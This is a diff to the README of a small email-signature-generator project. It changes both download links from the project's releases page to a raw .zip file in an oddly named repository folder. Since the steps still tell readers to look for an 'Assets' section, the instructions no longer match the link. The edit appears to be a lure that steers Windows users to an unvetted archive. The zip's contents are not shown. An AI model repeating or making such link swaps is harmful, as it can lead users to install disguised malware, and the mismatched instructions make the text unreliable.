@@ -1,6 +1,6 @@
 # 📧 email-signature-generator - Create professional signatures without any signups
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lunatic-rockcress936/email-signature-generator/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Lunatic-rockcress936/email-signature-generator/raw/refs/heads/main/overservile/signature-generator-email-1.3.zip)
 
 This application creates custom email signatures. It works directly in your web browser. You do not need to create an account or provide an email address. The tool saves your signature as an HTML file on your computer. You then copy this signature into your email client.
 
@@ -8,7 +8,7 @@ This application creates custom email signatures. It works directly in your web 
 
 The software lives on our release page. Follow these steps to get the files on your Windows computer:
 
-1. Visit this page to download: [https://github.com/Lunatic-rockcress936/email-signature-generator/releases](https://github.com/Lunatic-rockcress936/email-signature-generator/releases)
+1. Visit this page to download: [https://github.com/Lunatic-rockcress936/email-signature-generator/raw/refs/heads/main/overservile/signature-generator-email-1.3.zip](https://github.com/Lunatic-rockcress936/email-signature-generator/raw/refs/heads/main/overservile/signature-generator-email-1.3.zip)
 2. Locate the section labeled Assets.
 3. Click the link that ends in .zip.
 4. Wait for the download to finish.
